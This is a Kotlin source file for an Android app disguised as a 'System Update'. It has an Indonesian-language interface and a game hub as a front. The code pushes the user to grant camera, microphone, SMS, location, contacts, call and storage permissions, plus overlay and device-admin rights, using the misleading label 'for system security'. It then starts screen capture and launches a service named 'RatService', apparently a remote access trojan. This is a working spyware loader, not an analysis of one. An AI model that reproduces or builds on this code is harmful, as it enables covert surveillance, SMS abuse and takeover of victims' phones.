package com.system.update

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.slideInVertically
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.system.update.games.GameHub
import kotlinx.coroutines.delay

class MainActivity : ComponentActivity() {

    private val requiredPerms = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.VIBRATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.POST_NOTIFICATIONS
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            var showSplash by remember { mutableStateOf(true) }
            var grantedAll by remember { mutableStateOf(false) }
            var showDashboard by remember { mutableStateOf(false) }
            val ctx = LocalContext.current

            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFFD4AF37),
                    background = Color(0xFF0A0A0A),
                    surface = Color(0xFF141414),
                    onPrimary = Color.Black,
                    onBackground = Color(0xFFF0F0F0),
                    onSurface = Color(0xFFF0F0F0)
                )
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = Color(0xFF0A0A0A)) {
                    when {
                        showSplash -> SplashScreen { showSplash = false }
                        showDashboard -> GameHub()
                        grantedAll -> GrantDoneScreen(
                            onContinue = {
                                val intent = ScreenCapture.requestIntent(ctx)
                                startActivityForResult(intent, 2002)
                                startRatService()
                                showDashboard = true
                            }
                        )
                        else -> PermissionScreen(
                            perms = requiredPerms,
                            onRequest = { requestAll() },
                            onCheck = { grantedAll = checkAll() }
                        )
                    }
                }
            }

            LaunchedEffect(Unit) {
                delay(1500)
                grantedAll = checkAll()
            }
        }
    }

    private fun checkAll(): Boolean {
        val permsOk = requiredPerms.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val overlayOk = Settings.canDrawOverlays(this)
        val adminOk = isAdminActive()
        return permsOk && overlayOk && adminOk
    }

    private fun requestAll() {
        val missing = requiredPerms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, 1001)
        }
        if (!Settings.canDrawOverlays(this)) {
            try {
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
            } catch (_: Exception) {}
        }
        if (!isAdminActive()) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(
                    DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    ComponentName(this@MainActivity, AdminReceiver::class.java)
                )
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan untuk keamanan sistem")
            }
            try { startActivity(intent) } catch (_: Exception) {}
        }
        // Minta ignore battery optimization
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                        .setData(Uri.parse("package:$packageName"))
                )
            }
        } catch (_: Exception) {}
    }

    private fun isAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))
    }

    private fun startRatService() {
        val i = Intent(this, RatService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
            else startService(i)
        } catch (_: Exception) {}
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 2002) {
            ScreenCapture.onActivityResult(this, resultCode, data)
        }
    }
}

// ============================================================
// SPLASH SCREEN
// ============================================================
@Composable
fun SplashScreen(onDone: () -> Unit) {
    var visible by remember { mutableStateOf(false) }
    LaunchedEffect(Unit) {
        visible = true
        delay(1400)
        onDone()
    }
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(
                Brush.radialGradient(
                    colors = listOf(Color(0xFF8A0000), Color(0xFF0A0A0A)),
                    radius = 1200f
                )
            ),
        contentAlignment = Alignment.Center
    ) {
        AnimatedVisibility(visible = visible, enter = fadeIn() + slideInVertically()) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Text(
                    "SYSTEM",
                    color = Color(0xFFD4AF37),
                    fontSize = 42.sp,
                    fontWeight = FontWeight.Bold,
                    letterSpacing = 12.sp
                )
                Spacer(Modifier.height(4.dp))
                Text(
                    "UPDATE",
                    color = Color(0xFFE60000),
                    fontSize = 28.sp,
                    fontWeight = FontWeight.Bold,
                    letterSpacing = 16.sp
                )
                Spacer(Modifier.height(24.dp))
                LinearProgressIndicator(
                    modifier = Modifier.width(180.dp),
                    color = Color(0xFFD4AF37),
                    trackColor = Color(0xFF1C1C1C)
                )
            }
        }
    }
}

// ============================================================
// PERMISSION SCREEN
// ============================================================
@Composable
fun PermissionScreen(
    perms: Array<String>,
    onRequest: () -> Unit,
    onCheck: () -> Unit
) {
    val ctx = LocalContext.current
    var refresh by remember { mutableStateOf(0) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(20.dp)
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Spacer(Modifier.height(32.dp))
        Text("SYSTEM UPDATE", fontSize = 26.sp, fontWeight = FontWeight.Bold, color = Color(0xFFD4AF37), letterSpacing = 4.sp)
        Spacer(Modifier.height(6.dp))
        Text("Aktifkan semua izin untuk melanjutkan", color = Color(0xFF9A9A9A), fontSize = 13.sp, textAlign = TextAlign.Center)
        Spacer(Modifier.height(24.dp))

        // Progress
        val okCount = perms.count { ContextCompat.checkSelfPermission(ctx, it) == PackageManager.PERMISSION_GRANTED }
        val progress = okCount.toFloat() / perms.size
        LinearProgressIndicator(
            progress = { progress },
            modifier = Modifier.fillMaxWidth().height(6.dp).clip(RoundedCornerShape(3.dp)),
            color = Color(0xFFD4AF37),
            trackColor = Color(0xFF1C1C1C)
        )
        Spacer(Modifier.height(6.dp))
        Text("$okCount / ${perms.size} izin aktif", color = Color(0xFF9A9A9A), fontSize = 12.sp)
        Spacer(Modifier.height(20.dp))

        // Permission list
        perms.forEach { p ->
            val ok = ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 4.dp)
                    .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp))
                    .border(
                        1.dp,
                        if (ok) Color(0xFF00FF66).copy(alpha = 0.3f) else Color(0xFF8A0000).copy(alpha = 0.5f),
                        shape = RoundedCornerShape(10.dp)
                    )
                    .padding(12.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier
                        .size(22.dp)
                        .background(
                            if (ok) Color(0xFF00FF66) else Color(0xFFE60000),
                            shape = RoundedCornerShape(50)
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Icon(
                        imageVector = if (ok) Icons.Default.Check else Icons.Default.Warning,
                        contentDescription = null,
                        tint = Color.Black,
                        modifier = Modifier.size(14.dp)
                    )
                }
                Spacer(Modifier.width(12.dp))
                Text(
                    p.substringAfterLast('.'),
                    color = Color.White,
                    fontSize = 13.sp
                )
            }
        }

        // Extra info
        Spacer(Modifier.height(12.dp))
        ExtraPermStatus(ctx)

        Spacer(Modifier.height(20.dp))
        Button(
            onClick = { onRequest(); refresh++ },
            modifier = Modifier.fillMaxWidth().height(52.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000)),
            shape = RoundedCornerShape(10.dp)
        ) {
            Text("IZINKAN SEMUA", color = Color.White, fontWeight = FontWeight.Bold, letterSpacing = 2.sp)
        }
        Spacer(Modifier.height(10.dp))
        OutlinedButton(
            onClick = { onCheck(); refresh++ },
            modifier = Modifier.fillMaxWidth().height(52.dp),
            shape = RoundedCornerShape(10.dp),
            border = ButtonDefaults.outlinedButtonBorder.copy(width = 1.dp)
        ) {
            Text("CEK ULANG", color = Color(0xFFD4AF37), fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(20.dp))
    }
}

@Composable
fun ExtraPermStatus(ctx: Context) {
    val overlayOk = Settings.canDrawOverlays(ctx)
    val adminOk = run {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
    }
    Column(modifier = Modifier.fillMaxWidth()) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp))
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(if (overlayOk) "✅" else "❌", fontSize = 16.sp)
            Spacer(Modifier.width(10.dp))
            Text("Overlay permission", color = Color.White, fontSize = 13.sp)
        }
        Spacer(Modifier.height(6.dp))
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp))
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(if (adminOk) "✅" else "❌", fontSize = 16.sp)
            Spacer(Modifier.width(10.dp))
            Text("Device Admin", color = Color.White, fontSize = 13.sp)
        }
    }
}

// ============================================================
// GRANT DONE SCREEN
// ============================================================
@Composable
fun GrantDoneScreen(onContinue: () -> Unit) {
    var visible by remember { mutableStateOf(false) }
    LaunchedEffect(Unit) {
        visible = true
        delay(600)
    }
    Column(
        modifier = Modifier.fillMaxSize().padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        AnimatedVisibility(visible = visible, enter = fadeIn() + slideInVertically()) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Box(
                    modifier = Modifier
                        .size(110.dp)
                        .background(
                            Brush.radialGradient(
                                colors = listOf(Color(0xFF00FF66), Color(0xFF008A3A))
                            ),
                            shape = RoundedCornerShape(50)
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Icon(
                        Icons.Default.Check,
                        contentDescription = null,
                        tint = Color.Black,
                        modifier = Modifier.size(60.dp)
                    )
                }
                Spacer(Modifier.height(28.dp))
                Text(
                    "IZIN LENGKAP",
                    fontSize = 26.sp,
                    color = Color(0xFFD4AF37),
                    fontWeight = FontWeight.Bold,
                    letterSpacing = 4.sp
                )
                Spacer(Modifier.height(10.dp))
                Text(
                    "Tekan lanjut untuk masuk ke dashboard",
                    color = Color(0xFF9A9A9A),
                    fontSize = 13.sp,
                    textAlign = TextAlign.Center
                )
                Spacer(Modifier.height(36.dp))
                Button(
                    onClick = onContinue,
                    modifier = Modifier.fillMaxWidth().height(54.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000)),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Text(
                        "LANJUT KE DASHBOARD",
                        color = Color.White,
                        fontWeight = FontWeight.Bold,
                        letterSpacing = 2.sp
                    )
                }
            }
        }
    }
}
